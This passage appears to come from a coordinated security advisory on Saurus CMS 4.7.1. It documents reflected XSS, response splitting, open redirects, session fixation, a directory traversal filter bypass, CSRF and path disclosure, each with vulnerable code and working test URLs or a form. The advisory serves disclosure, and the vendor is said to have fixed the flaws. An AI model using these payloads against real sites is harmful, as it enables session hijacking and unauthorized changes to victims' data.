+  &did=<?=$site->fdat['did']?>'
+..
+<TD><a href="<?= $site->self ?>?profile_id=<?= $site->fdat['profile_id']?>&op=sync"
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/profiles.php?profile_id="><script>alert(123);</script>
+http://localhost/saurus471/admin/profiles.php?source_table="><script>alert(123);</script>
+http://localhost/saurus471/admin/profiles.php?profile_id=z&did="><script>alert(123);</script>
+
+Results: 
+
+javascript alert boxes popping up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+28. Reflected XSS in "admin/sys_alias.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameters "flt_keel" and "keel_id"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Test:
+
+http://localhost/saurus471/admin/sys_alias.php?flt_keel="><script>alert(123);</script>
+http://localhost/saurus471/admin/sys_alias.php?keel_id="><script>alert(123);</script>
+
+Result: 
+
+javascript alert boxes popping up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+29. Reflected XSS in "admin/sys_sonad_loetelu.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameters "flt_keel"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Test:
+
+http://localhost/saurus471/admin/sys_sonad_loetelu.php?flt_keel=</script><script>alert(123);</script>
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+30. Reflected XSS in "admin/user_management.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. all user-supplied parameters (excluding "selected_devices")
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+Php script "admin/user_management.php" line 138:
+------------------------[ source code start ]----------------------------------
+foreach($site->fdat as $fdat_field=>$fdat_value) { 
+  if($fdat_field != 'selected_devices'){
+    echo '<input type=hidden id="selectform_'.$fdat_field.'" 
+      name="'.$fdat_field.'" value="'.$fdat_value.'">';
+  } 
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/user_management.php?foobar="><script>alert(123);</script>
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+31. Reflected XSS in "admin/permissions.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameters "selected_group", "user_id", "group_id" and "role_id"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+Php script "admin/permissions.php" line 229:
+------------------------[ source code start ]----------------------------------
+<input type=hidden id="selectform_selected_group" name="selected_group" 
+value="<?=$site->fdat['selected_group']?>">
+<input type=hidden id="selectform_user_id" name="user_id" 
+value="<?=$site->fdat['user_id']?>">
+<input type=hidden id="selectform_group_id" name="group_id" 
+value="<?=$site->fdat['group_id']?>">
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/permissions.php?selected_group="><script>alert(123);</script>
+http://localhost/saurus471/admin/permissions.php?user_id="><script>alert(123);</script>
+http://localhost/saurus471/admin/permissions.php?group_id="><script>alert(123);</script>
+http://localhost/saurus471/admin/permissions.php?role_id="><script>alert(123);</script>
+
+
+Result: 
+
+javascript alert boxes popping up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+32. Reflected XSS in "admin/file_source.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied GET parameter "selected_group"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+Php script "admin/file_source.php" line 47:
+------------------------[ source code start ]----------------------------------
+$callback = (string)$_GET['callback'];
+..
+<?=$callback;?>("<?=str_replace(array('"', "\n", "\r"),
+    array('\"', '\n', '\r'), $fcontent);?>");
+------------------------[ source code end ]------------------------------------
+
+Test (parameter "file" must be valid):
+
+http://localhost/saurus471/admin/file_source.php?file=public/test.php&callback=alert(123);//
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+33. Reflected XSS in "admin/change_config.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "flt_keel" and "group"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/change_config.php" line 1220:
+------------------------[ source code start ]----------------------------------
+<input type=hidden name=flt_keel value="<?=$site->fdat['flt_keel']?>">
+..
+<input type="hidden" name="group" value="<?=$site->fdat['group']?>">
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/change_config.php?group=1&flt_keel="><script>alert(123);</script>
+http://localhost/saurus471/admin/change_config.php?group="><script>alert(123);</script>
+
+Result: 
+
+javascript alert boxes popping up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+34. Reflected XSS in "admin/forms.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "form_id"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/forms.php" line 222:
+------------------------[ source code start ]----------------------------------
+if($site->fdat['op'] == 'delete' && $site->fdat['form_id']) {
+..
+  <input type=hidden name=form_id value="<?=$site->fdat['form_id']?>">
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/forms.php?op=delete&form_id="><script>alert(123);</script>
+
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+35. Reflected XSS in "admin/lang_file.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. user-supplied parameter "flt_keel" and "keel_id"
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/lang_file.php" line 204:
+------------------------[ source code start ]----------------------------------
+$keel_id = isset($site->fdat[flt_keel]) ? $site->fdat[flt_keel] : $site->fdat[keel_id];
+..
+<input type=hidden name=keel_id value="<?=$keel_id ?>">
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/lang_file.php?op=import&flt_keel="><script>alert(123);</script>
+http://localhost/saurus471/admin/lang_file.php?op=import&keel_id="><script>alert(123);</script>
+
+
+Result: 
+
+javascript alert boxes popping up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+36. Reflected XSS in "admin/select_group.php"
+###############################################################################
+
+Reason:
+ 1. improper encoding or escaping of output
+Attack vector:
+ 1. all user-supplied parameters (excluding "selected_devices")
+Preconditions:
+ 1. logged in as Saurus CMS admin
+
+
+Php script "admin/select_group.php" line 442:
+------------------------[ source code start ]----------------------------------
+foreach($site->fdat as $fdat_field=>$fdat_value) { 
+  if($fdat_field != 'selected_devices'){
+    echo '<input type=hidden id="selectform_'.$fdat_field.'" 
+    name="'.$fdat_field.'" value="'.$fdat_value.'">
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/admin/select_group.php?foobar="><script>alert(123);</script>
+
+Result: 
+
+javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+###############################################################################
+37. HTTP Response Splitting  and insecure redirection in "redirect.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied GET parameter "url"
+Preconditions:
+ 1. php version < 4.4.2 or < 5.1.2
+
+
+Php script "redirect.php" line 100:
+------------------------[ source code start ]----------------------------------
+if($_GET['url'])
+{
+  $url = urldecode($_GET['url']);
+  //prevent Response Splitting attack
+  $url = preg_replace("!\r|\n.*!s", "", $url);
+  
+  header('Location: '.$_GET['url']);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/redirect.php?url=war%0d%0axe
+
+Result (using php 5.3.24): 
+
+Warning: Header may not contain more than a single header, new line detected in
+C:\apache_www\saurus471\redirect.php on line 106
+
+Test:
+
+http://localhost/saurus471/redirect.php?url=http://php.net/
+
+Result:
+
+successful redirection
+
+
+###############################################################################
+38. HTTP Response Splitting  and insecure redirection in "editor/redirect.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied GET parameter "url"
+Preconditions:
+ 1. php version < 4.4.2 or < 5.1.2
+
+
+Php script "editor/redirect.php" line 100:
+------------------------[ source code start ]----------------------------------
+if($_GET['url'])
+{
+  $url = urldecode($_GET['url']);
+  //prevent Response Splitting attack
+  $url = preg_replace("!\r|\n.*!s", "", $url);
+  
+  header('Location: '.$_GET['url']);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://localhost/saurus471/editor/redirect.php?url=war%0d%0axe
+
+Result (using php 5.3.24): 
+
+Warning: Header may not contain more than a single header, new line detected in
+C:\apache_www\saurus471\editor\redirect.php on line 106
+
+Test:
+
+http://localhost/saurus471/editor/redirect.php?url=http://php.net/
+
+Result:
+
+successful redirection
+
+
+###############################################################################
+39. HTTP Response Splitting in "idcard/index.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied GET and POST parameters "targeturl"
+Preconditions:
+ 1. HTTPS connection needed ("SSLRequireSSL" directive in ".htaccess" file)
+ 2. php version < 4.4.2 or < 5.1.2
+
+
+Php script "idcard/index.php" line 9:
+------------------------[ source code start ]----------------------------------
+if($_GET['targeturl']) { $targeturl = '?target_url='.$_GET['targeturl']; }
+elseif($_POST['targeturl']) { $targeturl = '?target_url='.$_POST['targeturl']; }
+
+
+header('Location: ../idcard.php'.$targeturl);
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+40. HTTP Response Splitting in "admin/lang_file.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameters "flt_keel" and "keel_id"
+Preconditions:
+ 1. php version < 4.4.2 or < 5.1.2
+ 2. logged in as Saurus CMS admin
+
+
+Php script "admin/lang_file.php" line 44:
+------------------------[ source code start ]----------------------------------
+$keel_id = isset($site->fdat[flt_keel]) ? $site->fdat[flt_keel] : $site->fdat[keel_id];
+..
+if ($site->fdat['op'] == 'export' && $site->fdat['op2'] == 'salvesta'){
+
+  header("Content-Disposition: attachment; filename=\"language".$keel_id.".csv\"");
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://localhost/saurus471/admin/lang_file.php?op=export&op2=salvesta&flt_keel=%0d%0a
+http://localhost/saurus471/admin/lang_file.php?op=export&op2=salvesta&keel_id=%0d%0a
+
+Result (using php 5.3.24, from errorlog): 
+
+Header may not contain more than a single header, new line detected
+
+
+###############################################################################
+41. HTTP Response Splitting in "admin/publish.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameter "url"
+Preconditions:
+ 1. php version < 4.4.2 or < 5.1.2
+ 2. logged in as Saurus CMS user with publish privileges
+
+
+Php script "admin/publish.php" line 118:
+------------------------[ source code start ]----------------------------------
+header("Location: ".(empty($_SERVER['HTTPS']) ? 'http://' : 'https://').$site->CONF[hostname].$site->fdat[url]);
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+42. HTTP Response Splitting in "add_comment.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameters "tpl", "c_tpl", "id", "redirect_url"
+Preconditions:
+ 1. php version < 4.4.2 or < 5.1.2
+
+
+Php script "add_comment.php" line 135:
+------------------------[ source code start ]----------------------------------
+header('Location: '.urldecode(preg_replace("!\r|\n.*!s", "", $_POST['redirect_url'])).'&lisa_alert=2');
+..
+header('Location: '.(empty($_SERVER['HTTPS']) ? 'http://': 
+'https://').$site->CONF['hostname'].$site->CONF['wwwroot'].
+($site->in_editor?'/editor':'').'/?'.(($site->fdat['tpl'] || 
+$site->fdat['c_tpl'])&&!$site->fdat['inserted_id']&&
+!$site->fdat['jump_to_parent']?'tpl='.$site->fdat['tpl'].
+'&c_tpl='.$site->fdat['c_tpl'].'&':'').'id='.$site->fdat['id'].'&lisa_alert=2');
+..
+if ($site->fdat['output_device'] == 'pda') {
+  if (strlen($site->fdat['text']) < 2 || strlen($site->fdat['nimi']) < 2) {
+    myRedirect($site->fdat['redirect_url']);
+..
+header("Location: ".urldecode($site->fdat['redirect_url']));
+..
+function myRedirect($url) {
+..
+  header("Location: " . urldecode($url));
+}
+------------------------[ source code end ]------------------------------------
+
+
+###############################################################################
+43. Information leakage in "admin/check_requirements.php"
+###############################################################################
+
+Reason: insufficient access control
+
+Test:
+
+http://localhost/saurus471/admin/check_requirements.php
+
+Result:
+
+Simple GET request as shown above reveals some information about web server:
+MySQL version, Webserver version, PHP version, multiple php setting values,
+multiple directory permissions. Anyone can access this diagnostic script, no
+access control exist.
+
+
+###############################################################################
+44. Session Fixation vulnerability in "admin/ajax_response.php"
+###############################################################################
+
+Attack vector:
+ 1. user-supplied POST parameter "PHPSESSID"
+Preconditions: none
+
+Some years ago PHP session fixation attacks were easy to exploit: just add
+PHPSESSID=112233445566 to URI and done. Modern PHP versions are more secure by
+default: PHP setting "session.use_only_cookies" defaults to "1" since 5.3.0,
+"session.use_trans_sid" defaults to "0". So even if PHP-based web application
+does have session fixation vulnerability, many real world installations are hard
+to exploit. Now let's look at Saurus CMS source code.
+
+Php script "admin/ajax_response.php" line 27:
+------------------------[ source code start ]----------------------------------
+if(isset($_POST['PHPSESSID']))
+{
+  session_id($_POST['PHPSESSID']);
+  session_start();
+}
+------------------------[ source code end ]------------------------------------
+
+We can see, that user-submitted POST parameter PHPSESSID is used as argument for
+PHP function "session_id()", which is followed by "session_start()". It means,
+that even if "session.use_only_cookies=1" and "session.use_trans_sid=0", session
+fixation attacks are possible.
+
+Test:
+
+<html><body><center>
+<form action="http://localhost/saurus471/admin/ajax_response.php" method="post">
+<input type="hidden" name="PHPSESSID" value="1122334455667788">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+
+Press "Test button" and then observe server response:
+
+HTTP/1.1 200 OK
+Date: Wed, 05 Jun 2013 10:26:19 GMT
+Server: Apache/2.2.22 (Win32) DAV/2 mod_ssl/2.2.22 OpenSSL/0.9.8t
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PHPSESSID=1122334455667788; path=/
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/javascript
+
+Now log in as Saurus CMS admin and look for session cookies:
+
+GET /saurus471/admin/index.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: logged=1; PHPSESSID=1122334455667788
+Connection: keep-alive
+
+We can see, that after authentication session ID does not change, which indicates
+Session Fixation vulnerability existence.
+
+Solution: implement session ID renewal after successful user authentication.
+
+
+###############################################################################
+45. Directory Traversal vulnerability in "admin/ajax_response.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+Attack vector:
+ 1. user-supplied parameter "name"
+Preconditions:
+ 1. logged in as valid Saurus CMS user
+Result: logged in Saurus CMS user can test existence of arbitrary files on
+remote server filesystem.
+
+
+Php script "admin/ajax_response.php" line 52:
+------------------------[ source code start ]----------------------------------
+// check if a file exists
+if($site->user->user_id && $_REQUEST['op'] == 'check_file' && $site->fdat['name'])
+{
+  include_once($class_path.'adminpage.inc.php');
+  
+  $pathinfo = str_replace(array('../', './', '..\\', '.\\'), '', $site->fdat['name']);
+  $pathinfo = explode('/', $pathinfo);
+  $filename = create_alias_from_string($pathinfo[count($pathinfo) - 1],true);
+  unset($pathinfo[count($pathinfo) - 1]);
+  $dirname = implode('/', $pathinfo);
+  
+  if(file_exists($site->absolute_path.$dirname.'/'.$filename))
+  {
+    echo '{"file_exists": 1}';
+  }
+  else 
+  {
+    echo '{"file_exists": 0}';
+  }
+------------------------[ source code end ]------------------------------------
+
+As seen above, php function "str_replace()" is used for filtering out possible
+directory traversal substrings. Such filtering is not secure enough and can be
+bypassed with specially crafted parameter "name".
+
+
+Test 1:
+
+http://localhost/saurus471/admin/ajax_response.php?op=check_file&name=..././..././/..././..././/..././..././/foobar.txt
+
+Result: {"file_exists": 0}
+
+Test 2:
+
+http://localhost/saurus471/admin/ajax_response.php?op=check_file&name=..././..././/..././..././/..././..././/test.txt
+
+Result: {"file_exists": 1}
+
+
+###############################################################################
+46. Cross-Site Request Forgery in "admin/trash.php"
+###############################################################################
+
+Reason:
+ 1. missing CSRF token checks
+Result:
+ 1. Unauthorized deletion of objects from Recycle Bin
+ 
+
+Php script "admin/trash.php" line 85:
+------------------------[ source code start ]----------------------------------
+if($site->fdat['delete_all'] && count($site->fdat['objects']))
+{
+  //empty trash
+  for($i = count($site->fdat['objects']) - 1; $i >= 0; $i--)
+  {
+    foreach($site->fdat['objects'][$i] as $object_id => $values) if($object_id)
+    {
+      $delete_objs = new Alamlist(array(
+        'parent' => $object_id,
+        'klass' => $classes,
+      ));
+      
+      while($object = $delete_objs->next())
+      {
+        $object->del();
+------------------------[ source code end ]------------------------------------
+
+As seen above, there is no protection against CSRF.
+
+Test:
+
+http://localhost/saurus471/admin/trash.php?delete_all=1&objects[]=1
+
+Result (from sitelog): "Recycle Bin emptied"
+
+Solution: use "verify_form_token()" function in critical places
+
+
+###############################################################################
+47. Cross-Site Request Forgery in "admin/change_config.php"
+###############################################################################
+
+Reason:
+ 1. missing CSRF token checks
+Result:
+ 1. Unauthorized modification of site configuration
+ 
+
+Php script "admin/change_config.php" line 85:
+------------------------[ source code start ]----------------------------------
+if ($site->fdat[salvesta]==1) {
+  foreach ($site->fdat as $key=>$value) {
+
+    if ( substr ($key, 0, 4) == "cff_" ) {
+      $sql = $site->db->prepare("UPDATE config SET sisu=? WHERE nimi=?", $value, substr ($key, 4));
+      $sth = new SQL($sql);
+------------------------[ source code end ]------------------------------------
+
+We can see, that there is no protection against CSRF.
+
+Tests:
+
+http://localhost/saurus471/admin/change_config.php?salvesta=1&cff_save_error_log=0
+http://localhost/saurus471/admin/change_config.php?salvesta=1&cff_save_error_log=1
+
+Result:
+ 
+Saurus CMS configuration setting "save_error_log" has been changed
+
+Solution: use "verify_form_token()" function in critical places
+
+
+###############################################################################
+48. Cross-Site Request Forgery in "admin/forms.php"
+###############################################################################
+
+Reason:
+ 1. missing CSRF token checks
+Result:
+ 1. Unauthorized deletion of forms
+ 
+
+Php script "admin/forms.php" line 137:
+------------------------[ source code start ]----------------------------------
+if($site->fdat['op2'] == 'deleteconfirmed' && $site->fdat['form_id']) {
+
+  # delete form
+  $sql = $site->db->prepare("DELETE FROM forms WHERE form_id=?",$site->fdat['form_id']);
+  $sth = new SQL($sql);
+------------------------[ source code end ]------------------------------------
+
+We can see, that there is no protection against CSRF.
+
+Test:
+
+http://localhost/saurus471/admin/forms.php?op2=deleteconfirmed&form_id=5
+
+Result (from sitelog): "Form 'testform' deleted"
+
+Solution: use "verify_form_token()" function in critical places
+
+
+###############################################################################
+49. Full Path Disclosure in multiple scripts
+###############################################################################
+
+Preconditions:
+  1. PHP setting "display_errors = On"
+
+Tests:
+
+http://localhost/saurus471/admin/edit_object.php
+
+Fatal error: Call to a member function msg() on a non-object in
+C:\apache_www\saurus471\admin\edit_object.php on line 1299
+
+http://localhost/saurus471/admin/edit_pilt.php
+
+Fatal error: Class 'Timer' not found in
+C:\apache_www\saurus471\admin\edit_pilt.php on line 21
+
+http://localhost/saurus471/admin/templates.php
+
+Fatal error: Call to a member function msg() on a non-object in
+C:\apache_www\saurus471\admin\templates.php on line 57
+
+
+Disclosure timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+06.06.2013 -> First email to vendor
+06.06.2013 -> First response email from vendor
+06.06.2013 -> Sending detailed information to vendor
+07.06.2013 -> Vendor started fixing found problems
+21.06.2013 -> Found problems are fixed
+14.07.2013 -> Current advisory released
+
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Waraxe forum:  http://www.waraxe.us/forums.html
+Personal homepage: http://www.janekvind.com/
+Random project: http://albumnow.com/
+---------------------------------- [ EOF ] ------------------------------------
